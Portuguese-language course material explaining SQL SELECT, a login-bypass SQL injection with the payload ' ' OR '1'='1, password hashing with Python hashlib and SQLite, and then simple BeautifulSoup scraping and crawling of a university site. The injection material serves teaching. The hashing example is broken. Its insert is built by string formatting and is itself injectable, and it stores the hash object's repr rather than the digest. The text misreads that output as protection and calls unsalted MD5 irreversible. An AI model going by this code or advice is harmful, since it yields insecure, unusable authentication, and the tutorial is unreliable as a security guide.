O comando SELECT é de longe o mais utilizado com frequência quando se fala em banco de dados e é o único 
comando do SQL que pode retornar nenhum dado, um registro ou várias linhas de registros. É o comando também que permite a elaboração 
e a utilização de várias funções e clausulas. Vamos ver um exemplo: vamos supor que eu queira fazer uma consulta em uma tabela chamada Produto:

SELECT * FROM Produto WHERE preco >= 200.00;

Lembrando que depois do comando SELECT listamos os campos (colunas) do nosso relatório e o asterisco (*) é um coringa que representa todos
 os campos da tabela e como utilizamos a clausula WHERE, filtramos os registros. Neste exemplo, pegamos todos campos da tabela Produto,
 mas só dos produtos com preços iguais ou maiores que 200.00.

Agora, vamos ver um outro exemplo: suponha que existe uma tabela Usuario com os campos: nome e senha, onde o nome seria o login do
 usuário e a senha dele. Esta tabela armazena os dados de login e senha dos usuários. Vamos supor que alguém queira invadir e tentar descobrir
 estes dados. Se o invasor conseguir passar pela segurança da infraestrutura, ele poderá injetar ou enviar, um tipo de dado em um comando SELECT, por exemplo:

SELECT * FROM Usuario WHERE senha = ‘ ‘ OR ‘1’ = ‘1’;

Este poderia ser um SELECT da aplicação para retornar ou até mesmo autenticar o usuário e a senha, pode ser até este tipo de SELECT:

SELECT * FROM Usuario WHERE nome = ‘vNome’ AND senha = ‘ ‘ OR ‘1’ = ‘1’;

Neste caso, qualquer um dos dois comandos SELECT retornariam todos os dados da tabela Usuario, vamos analisar o porquê:

O usuário vai digitar o seu login: nome e senha pela aplicação, por uma tela de login, estes dados serão armazenados em variáveis e o 
comando SELECT irá comparar através do WHERE o nome e a senha de acordo com os valores armazenados: WHERE nome = ‘vNome’ AND senha = ‘vSenha’. Neste caso, 
mesmo que o invasor não tenha privilégio para realizar um SELECT direto na tabela, mas ele pode mandar para a senha (pode ser também para o nome)
estes dados: ‘ ‘ OR ‘1’ = ‘1’. O que isto significa?

O invasor simplesmente utilizou a álgebra booleana: neste caso, mesmo que eu tenha um operador booleano AND, onde os dois lados da comparação têm que ser
verdadeiros para retornar algo. Do outro lado temos: senha = ‘ ‘ OR ‘1’ = ‘1’. O invasor passou uma comparação de um valor em branco ou (OR) 1 = 1.
 Como no caso do operador OR, se qualquer uma das comparações for verdadeira, ele retornará algo. E como 1 é igual a 1 (verdadeiro) e se o nome for verdadeiro, 
então neste caso, a senha será considerada qualquer valor e todos os dados da tabela Usuario serão retornados. Simplesmente, este tipo de SELECT é 
equivalente a SELECT * FROM Usuario. O invasor vai ter todos os nomes e senhas.

Vamos ver como poderemos dificultar, se um invasor conseguir passar por várias barreiras de segurança e conseguir injetar algum dado malicioso 
para conseguir obter algo.

A FUNÇÃO HASH
A função hash tem vários tipos de aplicações, no caso da computação, geralmente faz parte da criptografia, no caso seria transformar 
um valor absoluto em um valor hash. A função internamente vai estabelecer um link entre estes dois valores. Por exemplo, o usuário vai
 digitar os seus dados, mas estes estarão armazenados com um valor hash na tabela e a função hash conseguirá comparar estes dois valores.

Em Python, temos a função hash como nativa, basta importarmos:

>>> import hashlib
>>> var = hashlib.md5(b'abc123')
>>> print(var.hexdigest())
e99a18c428cb38d5f260853678922e03
>>>
Importamos a função hash com import hashlib, passamos um valor: abc123 para uma variável e na sequência, imprimimos, mostrando o valor em hexadecimal.

Em Python 3, principalmente, podemos trabalhar com vários algoritmos ou digest de condensação do hash criptográfico: md5, sha1, sha224, sha256, sha384 e sha512:

Hashlib.md5(b’   ‘) em Python 3 é obrigatório, neste caso, utilizar o parâmetro b (bytes) antes do valor a ser criptografado.

Vamos ver o mesmo exemplo com outro parâmetro:

>>> var = hashlib.sha256(b'abc123')
>>> print(var.hexdigest())
6ca13d52ca70c883e0f0bb101e425a89e8624de51db2d2392593af6a84118090
Utilizamos o algoritmo sha256 e em comparação com o md5, o md5 apresenta um valor mais condensado.

Vamos construir um exemplo na prática, utilizando um banco de dados que já vem nativo no Python: o SQLite. Lembre-se que 
quando trabalhamos com variáveis, estes dados ficam na memória principal e quando trabalhamos com banco de dados (SQL) estes dados ficam em disco.

Então, a primeira coisa a ser feita, é construirmos o banco de dados e a tabela. Para isso vamos criar um script:

# script para criar o banco de dados e a tabela
import sqlite3
conn = sqlite3.connect('empresa.db')
cursor = conn.cursor()
cursor.execute(
    'CREATE TABLE usuario(nome TEXT NOT NULL,senha TEXT NOT NULL);'
    )
Na linha 2, importamos o banco de dados SQLite.

Na linha 3, criamos a conexão e ao mesmo tempo o banco de dados com o nome empresa e a extensão db. É necessário criar um banco 
de dados com um nome e este banco de dados é o local onde ficarão as tabelas.

Na linha 4, criamos um cursor, que é uma espécie de ponteiro. Todo o comando SQL daqui para frente, utilizará este cursor. 
Se utilizarmos os comandos SQL diretamente numa IDE do banco de dados, não é necessário criar este cursor.

Na linha 6, utilizamos o cursor com o comando SQL: CREATE TABLE, para criar a tabela usuário com dois campos: nome e senha, com os 
tipos TEXT e a restrição NOT NULL.

Depois de criarmos a tabela, na sequência, vamos criar um script para cadastrar os dados:

# script para inserir dados do login
import sqlite3
import hashlib
conn = sqlite3.connect('empresa.db')
cursor = conn.cursor()
vnome = input('Digite o nome para o login: ')
vsenha = input('Digite uma senha para o login: ')
d = hashlib.md5()
d.update(vsenha.encode('utf-8'))
cursor.execute('insert into usuario values ("%s", "%s")' % (vnome, d))
conn.commit()
print("senha hash gerada: ",d.hexdigest())
input("Pressione ENTER para sair...")
Na linha 3, importamos a biblioteca hashlib.

Nas linhas 4 e 5, fizemos a conexão com o banco de dados e criamos um cursor.

Nas linhas 6 e 7, criamos variáveis para receber o nome e a senha.

Na linha 8, criamos uma variável d, para receber o hash com o algoritmo md5.

Na linha 9, aplicamos o hash na variável vsenha.

Na linha 10, com o cursor utilizamos o comando SQL: INSERT, para cadastrar o nome e a senha, passando os valores das variáveis: vnome e d.

Na linha 11, utilizamos o comando do SQL: commit para gravar os dados no disco.

Na lnha 12, mostramos o valor em hash gerado.

Vamos ver um exemplo do resultado do cadastro de cinco usuários:

Digite o nome para o login: denilson
Digite uma senha para o login: dd457
senha hash gerada:  39f8e34ed16c8a5aad61340cbb626664
Pressione ENTER para sair...
>>> 
Digite o nome para o login: cida
Digite uma senha para o login: yyt87r
senha hash gerada:  82e1d7a0c6490560b9dddaf32d2d81ce
Pressione ENTER para sair...
>>> 
Digite o nome para o login: mary
Digite uma senha para o login: Afp76
senha hash gerada:  82ff7acc17160345dbb723c688c6922f
Pressione ENTER para sair...
>>> 
Digite o nome para o login: analie
Digite uma senha para o login: 9d6te
senha hash gerada:  9a5fedd99272cca7318f1a85788b96cf
Pressione ENTER para sair...
>>> 
Digite o nome para o login: rapha
Digite uma senha para o login: g42m22
senha hash gerada:  4ba8d246e6189f442581743d22f9e4f0
Pressione ENTER para sair...
Agora vamos fazer uma consulta nos registros armazenados, para isto vamos criar um script de consulta:

# script para listar os logins dos usuários
import sqlite3
conn = sqlite3.connect('empresa.db')
cursor = conn.cursor()
cursor.execute('SELECT * FROM usuario;' )
for i in cursor.fetchall():
       print(i)
input('Pressione ENTER para sair...')
Na linha 5, executamos o comando SQL: SELECT.

Na linha 6, criamos um loop com a função fetchall(), o comando fetch pega a linha (registro) da tabela. E com o loop, varremos toda a tabela.

Ao rodar o scirpt, este será o resultado mostrado:

('denilson', '<md5 HASH object @ 0x01517608>')
('cida', '<md5 HASH object @ 0x015D7608>')
('mary', '<md5 HASH object @ 0x011A7608>')
('analie', '<md5 HASH object @ 0x03157608>')
('rapha', '<md5 HASH object @ 0x031A7608>')
Pressione ENTER para sair...
Neste caso, as senhas com o valor original não são mostradas. Internamente a função hash criou uma espécie de objeto
 para o valor que não está em caractere e sim em bytes. E outro detalhe, não há como reverter, ou seja, se o valor está em hash, 
não tem como descobrir o seu valor em caracteres. Desta forma, se o invasor conseguir acessar os dados, seria retornado algo como no exemplo acima.

Atualmente existem outras funções e formas de implementar criptografias. Estes exemplos são praticamente considerados de criptografia básica, 
mas já poderia dificultar a ação de um invasor.

SAIBA MAIS...
Dê uma olhada nos links abaixo para saber mais sobre a linguagem Python:

https://www.python.org/doc/

https://wiki.python.org/moin/PythonBooks

Neste tópico vimos a importância de proteger dados que vêm por alguma aplicação da WEB.

Apresentamos um exemplo de criptografia, através da implantação da função hash.

-----------------------------------------------------------------------------------------------------------------------

Criação crawlers web e exploits em Python
Apresentar a técnica de crawler, criando sripts para exploração (exploit) como exemplo utilizando funções da biblioteca Python.

NESTE TÓPICO
 Referências
NESTE TÓPICO

 Referências
Marcar
tópico

     

Olá alunos,

A técnica de crawler ou web crawler se assemelha e muitos nem fazem distinção, com a técnica de scraping.
 O termo de crawler tem como significado rastrear ou rastreador e o termo scrap tem como significado raspar.

Na realidade, o scraping consiste em extrair informações sobre um site. O crawler, também é chamado de spider ou bot (robot) e 
consiste em identificar as urls, os hiperlinks de um site, para uma futura visita, se necessário.

Como exemplos de crawlers, podemos citar dois tipos de grandes buscadores: o Yahoo! Sluro, o crawler da Yahoo!® e o Googlebot, que é o crawler da Google®.

Lembrando que exploits em certas situações, é um termo utilizado por invasores para explorar dados confidenciais, mas agora vamos utilizar este 
termo para criar scripts para explorar sites.

Vamos ver um tipo de script, mas antes é necessário utilizar um módulo que não está nativo no Python 3: lxml, é uma biblioteca que trabalha com o HTML e XML.

Para instalar, vamos utilizar o pip install: no Windows abra o prompt de comando e vá para a pasta Scripts que está dentro da pasta Python. (utilize o 
comando cd nomePasta para entrar nas pastas (diretórios) e cd.. para voltar para pasta (diretório) anterior). Utilize também o comando dir para verificar 
quais são os arquivos da pasta corrente.

 C:\> cd Python36-32
C:\Python36-32> cd Scripts
C:\Python36-32\Scripts>pip install lxml
Collecting lxml
  Downloading https://files.pythonhosted.org/packages/47/6d/c350f294c32b152e6a6fb34e7aabf2bacfd5f8cc08d59bed0ff3c5dc9cab/lxml-4.2.3-cp36-cp36m-win32.whl (3.2MB)
    100% |¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦| 3.2MB 2.9MB/s
Installing collected packages: lxml
Successfully installed lxml-4.2.3
Agora vamos ver um exemplo de script:

import urllib.request
import bs4 as bs
url = urllib.request.urlopen('http://www.uninove.br').read()
sopa = bs.BeautifulSoup(url, 'lxml')
print(sopa.h1.text)
input('Pressione ENTER para sair...')
Na linha 1, importamos as bibliotecas: urllib e request e na linha 2, importamos o módulo já conhecido BeautifulSoup (bs4), a já conhecida ‘sopa bonita”.

Na linha 3, passamos para a variável url a página da Uninove como exemplo. A função urlopen vai abrir a página e pegar todos os dados.

Na linha 5, após pegarmos os dados da página, utilizamos como filtro, a tag h1, que representa o título da página. O resultado foi este:

Radar UNINOVE
Pressione ENTER para sair... 
Vamos modificar um pouco o script:

import urllib.request
import bs4 as bs
from pprint import pprint
url = urllib.request.urlopen('http://www.uninove.br').read()
sopa = bs.BeautifulSoup(url, 'lxml')
pprint(sopa.find_all('p'))
input('Pressione ENTER para sair...')
Na linha 3, utilizamos a função pprint, que é parecida com a função print, só que apresenta um resultado mais formatado. 
O primeiro p de print significa a palavra pretty (bonita).

Na linha 6, utilizamos um outro filtro, a tag p que pega os parágrafos da página.

E uma parte do resultado foi este:

</script>
<script src="http://www.uninove.br/app/plugins/responsive-lightbox/js/front.js?ver=1.7.2" type="text/javascript"></script>
<link href="http://www.uninove.br/wp-json/" rel="https://api.w.org/"/>
<link href="http://www.uninove.br/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.uninove.br%2F" rel="alternate" type="application/json+oembed"/>
<link href="http://www.uninove.br/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.uninove.br%2F&amp;format=xml" rel="alternate" type="text/xml+oembed"/>
</p>,
 <p>Informação e conhecimento disponíveis o tempo todo para você!</p>,
 <p><a href="http://www.uninove.br/biblioteca/sobre-a-biblioteca/apresentacao/">Acesse.</a></p>,
 <p>Laboratórios das áreas de exatas e biológicas, com recursos modernos que dinamizam o aprendizado.</p>,
 <p><a href="http://www.uninove.br/conheca-a-uninove/estrutura/laboratorios/">Visite.</a></p>,
 <p>Primeira Universidade a oferecer wifi ilimitado para mais de 150 mil alunos.</p>]
Pressione ENTER para sair...
Vamos continuar a modificar os filtros:

import urllib.request
import bs4 as bs
from pprint import pprint
url = urllib.request.urlopen('http://www.uninove.br').read()
sopa = bs.BeautifulSoup(url, 'lxml')
for cont in sopa.find_all('p'):
    pprint(cont.string)
input('Pressione ENTER para sair...')
Na linha 6, abrimos um loop para percorrer e encontrar todos os parágrafos da página, pois a tag p representa todos os parágrafos.

O resultado foi este:

'Informação e conhecimento disponíveis o tempo todo para você!'
'Acesse.'
('Laboratórios das áreas de exatas e biológicas, com recursos modernos que '
 'dinamizam o aprendizado.')
'Visite.'
'Primeira Universidade a oferecer wifi ilimitado para mais de 150 mil alunos.'
Pressione ENTER para sair...
Vamos continuar a modificar o script:

import urllib.request
import bs4 as bs
from pprint import pprint
url = urllib.request.urlopen('http://www.uninove.br').read()
sopa = bs.BeautifulSoup(url, 'lxml')
corpo = sopa.body              
for cont in corpo.find_all('p'):
    pprint(cont.string)
input('Pressione ENTER para sair...')
Na linha 6, criamos a variável corpo para considerar só a parte principal da página (body) e no caso, os parágrafos da parte principal

E o resultado foi este:

'Informação e conhecimento disponíveis o tempo todo para você!'
'Acesse.'
('Laboratórios das áreas de exatas e biológicas, com recursos modernos que '
 'dinamizam o aprendizado.')
'Visite.'
'Primeira Universidade a oferecer wifi ilimitado para mais de 150 mil alunos.'
Pressione ENTER para sair...
No caso, o resultado são os mesmos porque todas as strings dos parágrafos estão na parte principal da página.

Vamos continuar utilizando outro filtro:

import urllib.request
import bs4 as bs
from pprint import pprint
url = urllib.request.urlopen('http://www.uninove.br').read()
sopa = bs.BeautifulSoup(url, 'lxml')
pprint(sopa.find_all('i'))
input('Pressione ENTER para sair...')
Na linha 6, utilizamos o filtro com a tag i que pegou todos os ícones da página e o resultado foi este:

[<i class="icon-menu"></i>,
 <i class="icon-search"></i>,
 <i class="icon-person"></i>,
 <i class="icon-radar"></i>,
 <i class="icon-radar"></i>,
 <i class="icon-facebook"></i>,
 <i class="icon-twitter"></i>,
 <i class="icon-google-plus"></i>,
 <i class="icon-facebook"></i>,
 <i class="icon-twitter"></i>,
 <i class="icon-google-plus"></i>,
 <i class="icon-facebook"></i>,
 <i class="icon-twitter"></i>,
 <i class="icon-google-plus"></i>,
 <i class="icon-facebook"></i>,
 <i class="icon-twitter"></i>,
 <i class="icon-google-plus"></i>,
 <i class="icon-facebook"></i>,
 <i class="icon-twitter"></i>,
 <i class="icon-google-plus"></i>,
 <i class="icon-facebook"></i>,
 <i class="icon-twitter"></i>,
 <i class="icon-google-plus"></i>,
 <i class="icon-facebook"></i>,
 <i class="icon-twitter"></i>,
 <i class="icon-youtube"></i>,
 <i class="icon-google-plus"></i>,
 <i class="icon2-linkedin"></i>]
Pressione ENTER para sair...
Até agora, utilizamos os scripts praticamente para realizar o scraping (raspagem) da página da WEB. Vamos então, 
tentar utilizar o mesmo tipo de script para fazer um crawling (rastreamento):

import urllib.request
import bs4 as bs
from pprint import pprint
url = urllib.request.urlopen('http://www.uninove.br').read()
sopa = bs.BeautifulSoup(url, 'lxml')
for cont in sopa.find_all('a'): 
    pprint(cont.string)
input('Pressione ENTER para sair...')
Na linha 6, criamos um loop com a tag a que vai trazer os links da página para outros recursos da própria página e o resultado foi este:

'Processo Seletivo'
'GRADUAÇÃO'
'MESTRADO E DOUTORADO'
'ESPECIALIZAÇÃO, MBA E APRIMORAMENTO'
'EAD'
'MEDICINA'
'Resultados e matrículas'
'RESIDÊNCIAS EM SAÚDE'
'Cursos de Docência'
'ENEM'
'Cursos'
'Graduação'
'EAD'
'Especialização e MBA'
'Cursos de aprimoramento'
'Medicina'
'Mestrado e Doutorado'
'Colégio e Cursos Técnicos'
'Cursos de Docência'
'Cursos Livres'
Continuando com o rastreamento da página:

import urllib.request
import bs4 as bs
from pprint import pprint
url = urllib.request.urlopen('http://www.uninove.br').read()
sopa = bs.BeautifulSoup(url, 'lxml')
for cont in sopa.find_all('a'): 
    pprint(cont.get('href'))
input('Pressione ENTER para sair...')
Na linha 7, além de pegar os links da página para outros recursos, também trouxe todos os links do site com a tag href.

Vamos ver o resultado:

'#panel-main-selective-proccess-mobile'
'https://seletivo.uninove.br/graduacao-e-curta-duracao/todos/todos/#utm_source=portal&utm_medium=menu-seletivo&utm_campaign=padrao&utm_content=link-seletivo'
'http://www.uninove.br/mestrado-e-doutorado/'
'http://www.uninove.br/inscricao-de-pos-graduacao/'
'https://seletivo.uninove.br/graduacao-e-curta-duracao/todos/todos/#utm_source=portal&utm_medium=menu-seletivo-ead&utm_campaign=padrao&utm_content=link-seletivo'
'http://www.uninove.br/inscricoes-de-medicina/'
'http://www.uninove.br/processo-seletivo/resultado-e-matriculas/'
'http://www.uninove.br/residencia-saude/'
'http://www.uninove.br/docencia/'
'http://www.uninove.br/processo-seletivo/usando-a-nota-do-enem/'
'#panel-main-courses-mobile'
'http://www.uninove.br/graduacao/'
'http://www.uninove.br/ead/'
'http://www.uninove.br/pos-graduacao/'
'http://www.uninove.br/aprimoramento/'
'http://www.uninove.br/graduacao/medicina/'
'http://www.uninove.br/mestrado-e-doutorado/'
'http://www.uninove.br/colegio/'
'http://www.uninove.br/docencia/'
'http://www.uninove.br/cursos-livres/'
Este tipo de resultado está mais ligado à técnica de crawler, pegamos as urls da página e podemos armazena-las para futuras pesquisas.

Vamos continuar:

import urllib.request
import bs4 as bs
from pprint import pprint
url = urllib.request.urlopen('http://www.uninove.br').read()
sopa = bs.BeautifulSoup(url, 'lxml')
navegacao = sopa.nav                 
for cont in navegacao.find_all('a'):
    print(cont.get('href'))
 
input('Pressione ENTER para sair...')
Na linha 6, criamos uma variável navegacao para receber o parâmetro nav, ligado a tag nav que está ligada aos links de navegação da página. 
E com isto, na linha 8, com o print em loop, imprimimos todos as urls de navegação do site da Uninove.

O resultado foi este:

https://seletivo.uninove.br/graduacao-e-curta-duracao/todos/todos/#utm_source=portal&utm_medium=menu-seletivo&utm_campaign=padrao&utm_content=link-seletivo
http://www.uninove.br/mestrado-e-doutorado/
http://www.uninove.br/inscricao-de-pos-graduacao/
https://seletivo.uninove.br/graduacao-e-curta-duracao/todos/todos/#utm_source=portal&utm_medium=menu-seletivo-ead&utm_campaign=padrao&utm_content=link-seletivo
http://www.uninove.br/inscricoes-de-medicina/
http://www.uninove.br/processo-seletivo/resultado-e-matriculas/
http://www.uninove.br/residencia-saude/
http://www.uninove.br/docencia/
http://www.uninove.br/processo-seletivo/usando-a-nota-do-enem/
Pressione ENTER para sair... 
Atualmente existem diversas ferramentas que fazem este tipo de processamento. Na realidade, isto está ligado a filtros utilizados em scraping ou em 
crawler, como já comentado a diferença entre estas duas técnicas é muito tênue, pois o objetivo é colher informações para as pesquisas necessárias.

SAIBA MAIS...
Dê uma olhada nos links abaixo para saber mais sobre a linguagem Python:

https://www.python.org/doc/

https://wiki.python.org/moin/PythonBooks

Neste tópico vimos a técnica de crawler e a pequena diferença com a do scraping em páginas da WEB. Aplicamos exemplos com scripts, que através do
 Pyhton podem ser criados até de forma simples, utilizando a sua biblioteca.


